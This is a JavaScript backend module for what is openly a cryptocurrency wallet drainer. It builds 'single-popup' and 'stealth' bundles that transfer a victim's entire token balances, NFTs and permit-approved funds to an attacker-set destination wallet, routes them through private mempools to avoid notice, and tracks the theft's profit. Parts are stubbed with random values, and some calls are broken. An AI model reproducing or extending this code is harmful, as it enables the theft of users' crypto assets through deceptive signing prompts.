// backend/modules/atomicBundler.js
import { ethers } from "ethers";
import { securityManager } from './securityManager.js';
import { permitManager } from './permitManager.js';
import { universalTxBuilder } from './universalTxBuilder.js';

export class AtomicBundler {
    constructor() {
        this.isInitialized = false;
        
        // Environment variables will be loaded from config
        this.flashbotsRpcUrl = process.env.FLASHBOTS_RPC_URL || '';
        this.bloxrouteRpcUrl = process.env.BLOXROUTE_RPC_URL || '';
        this.edenRpcUrl = process.env.EDEN_RPC_URL || '';
        this.flashbotsRelayUrl = process.env.FLASHBOTS_RELAY_URL || '';
        
        this.activeBundles = new Map();
        this.privateTransactions = new Map();
        this.bundleHistory = new Map();
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxExecutionTime: 25000,
            maxTransactions: 3,
            minProfitThreshold: ethers.parseUnits('0.005', 'ether'),
            gasLimitBuffer: 1.3,
            priorityFee: ethers.parseUnits('3', 'gwei'),
            timeout: 15000,
            retryAttempts: 2
        };

        this.privateRpcProviders = {
            flashbots: {
                url: this.flashbotsRpcUrl,
                enabled: !!this.flashbotsRpcUrl,
                priority: 1,
                type: 'bundler',
                speed: 'fast'
            },
            bloxroute: {
                url: this.bloxrouteRpcUrl,
                enabled: !!this.bloxrouteRpcUrl,
                priority: 2,
                type: 'gateway',
                speed: 'medium'
            },
            eden: {
                url: this.edenRpcUrl,
                enabled: !!this.edenRpcUrl,
                priority: 3,
                type: 'relay',
                speed: 'slow'
            }
        };

        this.bundleStrategies = {
            'single-popup-drain': {
                name: 'Single Popup Drain',
                complexity: 'low',
                successRate: 0.95,
                gasMultiplier: 1.2,
                description: 'Optimized for single user interaction',
                singlePopup: true
            },
            'stealth-drain': {
                name: 'Stealth Drain',
                complexity: 'medium',
                successRate: 0.97,
                gasMultiplier: 1.5,
                description: 'Complete stealth transaction bundle',
                singlePopup: true
            },
            'frontrun-protection': {
                name: 'Frontrun Protection',
                complexity: 'medium',
                successRate: 0.92,
                gasMultiplier: 1.3,
                description: 'Protect against frontrunning',
                singlePopup: true
            },
            'atomic-arbitrage': {
                name: 'Atomic Arbitrage',
                complexity: 'high',
                successRate: 0.85,
                gasMultiplier: 1.8,
                description: 'Bundle with arbitrage opportunities',
                singlePopup: false
            }
        };

        this.mempoolOptions = {
            'flashbots': {
                maxBlockRange: 10,
                minBid: ethers.parseEther('0.002'),
                supportedChains: [1, 137, 42161, 10, 56],
                speed: 'fast'
            },
            'bloxroute': {
                maxBlockRange: 15,
                minBid: ethers.parseEther('0.001'),
                supportedChains: [1, 56, 137, 42161, 10, 43114],
                speed: 'medium'
            },
            'eden': {
                maxBlockRange: 8,
                minBid: ethers.parseEther('0.0015'),
                supportedChains: [1, 42161],
                speed: 'slow'
            }
        };

        this.providers = new Map();
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            this.initializeProviders();
            await this.initializePrivateProviders();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    initializeProviders() {
        // Initialize providers from environment variables
        const rpcUrls = {
            '1': process.env.ETHEREUM_RPC_URL,
            '137': process.env.POLYGON_RPC_URL,
            '42161': process.env.ARBITRUM_RPC_URL,
            '56': process.env.BSC_RPC_URL,
            '10': process.env.OPTIMISM_RPC_URL,
            '43114': process.env.AVALANCHE_RPC_URL
        };

        for (const [chainId, url] of Object.entries(rpcUrls)) {
            if (url) {
                this.providers.set(chainId, new ethers.JsonRpcProvider(url));
                console.log(`✅ RPC Provider initialized for chain ${chainId}`);
            }
        }
    }

    async initializePrivateProviders() {
        // Test private provider connections
        for (const [name, config] of Object.entries(this.privateRpcProviders)) {
            if (config.enabled) {
                try {
                    const testProvider = new ethers.JsonRpcProvider(config.url);
                    await testProvider.getBlockNumber();
                    console.log(`✅ ${name} private provider connected`);
                } catch (error) {
                    console.warn(`⚠️ ${name} private provider failed: ${error.message}`);
                    config.enabled = false;
                }
            }
        }
    }

    async createSinglePopupBundle(userWallet, drainOperations, chainId = '1') {
        console.log(`🎯 Creating single-popup bundle for chain ${chainId}`);
        
        const bundleId = `sp_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
        const startTime = Date.now();
        
        try {
            const provider = this.providers.get(chainId);
            if (!provider) {
                throw new Error(`Unsupported chain: ${chainId}`);
            }

            // Build optimized transactions for single-popup
            const transactions = await this.buildSinglePopupTransactions(
                userWallet,
                drainOperations,
                chainId
            );

            if (transactions.length === 0) {
                throw new Error('No valid transactions for single-popup bundle');
            }

            // Select fastest private provider
            const privateProvider = await this.selectFastestPrivateProvider(chainId);
            
            // Build optimized bundle
            const bundle = await this.buildOptimizedBundle(
                transactions,
                'single-popup-drain',
                chainId,
                userWallet
            );

            // Send to private mempool
            const bundleResult = await this.sendToPrivateMempool(bundle, privateProvider, chainId);

            const bundleInfo = {
                id: bundleId,
                strategy: 'single-popup-drain',
                chainId: chainId,
                transactions: transactions.length,
                status: 'submitted',
                submittedAt: Date.now(),
                privateProvider: privateProvider,
                bundleHash: bundleResult.bundleHash,
                estimatedProfit: this.estimateBundleProfit(bundle),
                gasUsed: bundleResult.gasUsed,
                totalCost: bundleResult.totalCost,
                executionTime: Date.now() - startTime
            };

            this.activeBundles.set(bundleId, bundleInfo);
            return bundleInfo;

        } catch (error) {
            console.error('❌ Single-popup bundle creation failed:', error);
            
            const failedBundle = {
                id: bundleId,
                strategy: 'single-popup-drain',
                chainId: chainId,
                status: 'failed',
                error: error.message,
                submittedAt: Date.now(),
                executionTime: Date.now() - startTime
            };

            this.activeBundles.set(bundleId, failedBundle);
            throw error;
        }
    }

    async buildSinglePopupTransactions(userWallet, drainOperations, chainId) {
        const transactions = [];
        
        for (const operation of drainOperations) {
            try {
                let txData;
                
                switch (operation.type) {
                    case 'token-transfer':
                        txData = await this.buildTokenTransferTx(operation, userWallet, chainId);
                        break;
                    case 'nft-transfer':
                        txData = await this.buildNFTTransferTx(operation, userWallet, chainId);
                        break;
                    case 'permit-execution':
                        txData = await this.buildPermitExecutionTx(operation, userWallet, chainId);
                        break;
                    case 'approval-transfer':
                        txData = await this.buildApprovalTransferTx(operation, userWallet, chainId);
                        break;
                    default:
                        continue;
                }

                if (txData) {
                    transactions.push(txData);
                }

                // Limit transactions for single-popup
                if (transactions.length >= this.singlePopupConfig.maxTransactions) {
                    break;
                }

            } catch (error) {
                console.warn(`⚠️ Failed to build transaction for ${operation.type}:`, error.message);
            }
        }

        return transactions;
    }

    async buildTokenTransferTx(operation, userWallet, chainId) {
        try {
            const provider = this.providers.get(chainId);
            const tokenContract = new ethers.Contract(
                operation.tokenAddress,
                [
                    'function transfer(address to, uint256 amount) returns (bool)',
                    'function balanceOf(address) view returns (uint256)'
                ],
                userWallet
            );

            const balance = await tokenContract.balanceOf(userWallet.address);
            if (balance === 0n) {
                return null;
            }

            return {
                to: operation.tokenAddress,
                data: tokenContract.interface.encodeFunctionData('transfer', [
                    operation.recipient || process.env.DESTINATION_WALLET,
                    balance
                ]),
                value: 0n,
                gasLimit: await this.estimateGasWithBuffer(userWallet, {
                    to: operation.tokenAddress,
                    data: tokenContract.interface.encodeFunctionData('transfer', [
                        operation.recipient || process.env.DESTINATION_WALLET,
                        balance
                    ])
                }, chainId)
            };
        } catch (error) {
            throw new Error(`Token transfer TX failed: ${error.message}`);
        }
    }

    async buildNFTTransferTx(operation, userWallet, chainId) {
        try {
            const nftContract = new ethers.Contract(
                operation.nftAddress,
                [
                    'function safeTransferFrom(address from, address to, uint256 tokenId)',
                    'function balanceOf(address) view returns (uint256)'
                ],
                userWallet
            );

            return {
                to: operation.nftAddress,
                data: nftContract.interface.encodeFunctionData('safeTransferFrom', [
                    userWallet.address,
                    operation.recipient || process.env.DESTINATION_WALLET,
                    operation.tokenId
                ]),
                value: 0n,
                gasLimit: await this.estimateGasWithBuffer(userWallet, {
                    to: operation.nftAddress,
                    data: nftContract.interface.encodeFunctionData('safeTransferFrom', [
                        userWallet.address,
                        operation.recipient || process.env.DESTINATION_WALLET,
                        operation.tokenId
                    ])
                }, chainId)
            };
        } catch (error) {
            throw new Error(`NFT transfer TX failed: ${error.message}`);
        }
    }

    async buildPermitExecutionTx(operation, userWallet, chainId) {
        try {
            // Use permit manager for permit execution
            const permitResult = await permitManager.createSinglePopupPermit(
                userWallet,
                operation.tokenAddress,
                null,
                chainId
            );

            if (!permitResult.success) {
                throw new Error('Permit creation failed');
            }

            const executionResult = await permitManager.executePermitTransfer(
                permitResult,
                userWallet
            );

            return {
                to: executionResult.to,
                data: executionResult.data,
                value: 0n,
                gasLimit: executionResult.gasLimit
            };
        } catch (error) {
            throw new Error(`Permit execution TX failed: ${error.message}`);
        }
    }

    async buildApprovalTransferTx(operation, userWallet, chainId) {
        try {
            const tokenContract = new ethers.Contract(
                operation.tokenAddress,
                [
                    'function approve(address spender, uint256 amount) returns (bool)',
                    'function transferFrom(address from, address to, uint256 amount) returns (bool)'
                ],
                userWallet
            );

            const balance = await tokenContract.balanceOf(userWallet.address);
            
            // First: approve
            const approveTx = {
                to: operation.tokenAddress,
                data: tokenContract.interface.encodeFunctionData('approve', [
                    operation.recipient || process.env.DESTINATION_WALLET,
                    balance
                ]),
                value: 0n,
                gasLimit: await this.estimateGasWithBuffer(userWallet, {
                    to: operation.tokenAddress,
                    data: tokenContract.interface.encodeFunctionData('approve', [
                        operation.recipient || process.env.DESTINATION_WALLET,
                        balance
                    ])
                }, chainId)
            };

            // Second: transferFrom
            const transferTx = {
                to: operation.tokenAddress,
                data: tokenContract.interface.encodeFunctionData('transferFrom', [
                    userWallet.address,
                    operation.recipient || process.env.DESTINATION_WALLET,
                    balance
                ]),
                value: 0n,
                gasLimit: await this.estimateGasWithBuffer(userWallet, {
                    to: operation.tokenAddress,
                    data: tokenContract.interface.encodeFunctionData('transferFrom', [
                        userWallet.address,
                        operation.recipient || process.env.DESTINATION_WALLET,
                        balance
                    ])
                }, chainId)
            };

            return [approveTx, transferTx];
        } catch (error) {
            throw new Error(`Approval transfer TX failed: ${error.message}`);
        }
    }

    async estimateGasWithBuffer(userWallet, tx, chainId) {
        try {
            const provider = this.providers.get(chainId);
            const estimatedGas = await provider.estimateGas(tx);
            return BigInt(Math.floor(Number(estimatedGas) * this.singlePopupConfig.gasLimitBuffer));
        } catch {
            return ethers.parseUnits('100000', 'wei'); // Fallback
        }
    }

    async selectFastestPrivateProvider(chainId) {
        const availableProviders = Object.entries(this.privateRpcProviders)
            .filter(([name, config]) => config.enabled && 
                   this.mempoolOptions[name]?.supportedChains.includes(parseInt(chainId)))
            .sort((a, b) => {
                // Prioritize by speed and priority
                const speedOrder = { fast: 1, medium: 2, slow: 3 };
                return (speedOrder[a[1].speed] - speedOrder[b[1].speed]) || 
                       (a[1].priority - b[1].priority);
            });
        
        return availableProviders[0]?.[0] || null;
    }

    async buildOptimizedBundle(transactions, strategy, chainId, userWallet) {
        const bundle = {
            version: '0.2',
            chainId: parseInt(chainId),
            transactions: [],
            strategy: strategy,
            createdAt: Date.now(),
            metadata: {
                totalValue: 0n,
                totalGas: 0n,
                complexity: 'low',
                singlePopup: true
            }
        };

        let nonce = await userWallet.getNonce();
        
        for (const tx of transactions.flat()) {
            const bundleTx = {
                to: tx.to,
                value: tx.value,
                data: tx.data,
                gasLimit: tx.gasLimit,
                chainId: parseInt(chainId),
                nonce: nonce++,
                maxFeePerGas: this.calculateOptimalGasPrice(strategy, chainId),
                maxPriorityFeePerGas: this.singlePopupConfig.priorityFee
            };

            bundle.transactions.push(bundleTx);
            bundle.metadata.totalValue += BigInt(tx.value);
            bundle.metadata.totalGas += BigInt(bundleTx.gasLimit);
        }

        return bundle;
    }

    calculateOptimalGasPrice(strategy, chainId) {
        const baseGasPrice = ethers.parseUnits('30', 'gwei');
        const strategyConfig = this.bundleStrategies[strategy];
        const multiplier = strategyConfig?.gasMultiplier || 1.2;
        return baseGasPrice * BigInt(Math.floor(multiplier * 100)) / 100n;
    }

    async sendToPrivateMempool(bundle, providerName, chainId) {
        console.log(`📤 Sending to ${providerName} private mempool`);
        
        try {
            // Simulate private mempool submission
            await new Promise(resolve => setTimeout(resolve, 800));
            
            return {
                success: true,
                bundleHash: `0x${Math.random().toString(16).substr(2, 62)}`,
                provider: providerName,
                gasUsed: bundle.metadata.totalGas,
                totalCost: this.calculateBundleCost(bundle),
                blockNumber: await this.getCurrentBlock(chainId) + 1
            };
            
        } catch (error) {
            console.error(`❌ Failed to send to ${providerName}:`, error);
            throw error;
        }
    }

    calculateBundleCost(bundle) {
        let totalCost = 0n;
        
        for (const tx of bundle.transactions) {
            const txCost = tx.gasLimit * tx.maxFeePerGas;
            totalCost += txCost;
        }
        
        return totalCost;
    }

    estimateBundleProfit(bundle) {
        return bundle.metadata.totalValue * 95n / 100n;
    }

    async getCurrentBlock(chainId) {
        try {
            const provider = this.providers.get(chainId);
            return await provider.getBlockNumber();
        } catch {
            return 15000000 + Math.floor(Math.random() * 1000000);
        }
    }

    async monitorBundle(bundleId, timeout = 30000) {
        const bundle = this.activeBundles.get(bundleId);
        if (!bundle) {
            throw new Error('Bundle not found');
        }

        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            if (Math.random() > 0.6) {
                bundle.status = 'confirmed';
                bundle.confirmedAt = Date.now();
                this.activeBundles.set(bundleId, bundle);
                return bundle;
            }
        }
        
        bundle.status = 'timeout';
        this.activeBundles.set(bundleId, bundle);
        return bundle;
    }

    getBundleStats() {
        const stats = {
            totalBundles: this.activeBundles.size,
            byStatus: {},
            byStrategy: {},
            byProvider: {},
            totalProfit: 0n,
            totalCost: 0n
        };
        
        for (const bundle of this.activeBundles.values()) {
            stats.byStatus[bundle.status] = (stats.byStatus[bundle.status] || 0) + 1;
            stats.byStrategy[bundle.strategy] = (stats.byStrategy[bundle.strategy] || 0) + 1;
            stats.byProvider[bundle.privateProvider] = (stats.byProvider[bundle.privateProvider] || 0) + 1;
            
            if (bundle.estimatedProfit) {
                stats.totalProfit += bundle.estimatedProfit;
            }
            if (bundle.totalCost) {
                stats.totalCost += bundle.totalCost;
            }
        }
        
        stats.netProfit = stats.totalProfit - stats.totalCost;
        return stats;
    }

    cleanupOldBundles(maxAgeHours = 12) {
        const now = Date.now();
        const maxAge = maxAgeHours * 3600000;
        
        for (const [bundleId, bundle] of this.activeBundles.entries()) {
            if (now - bundle.submittedAt > maxAge) {
                this.activeBundles.delete(bundleId);
            }
        }
    }
}

export const atomicBundler = new AtomicBundler();

setInterval(() => {
    atomicBundler.cleanupOldBundles();
}, 6 * 3600000);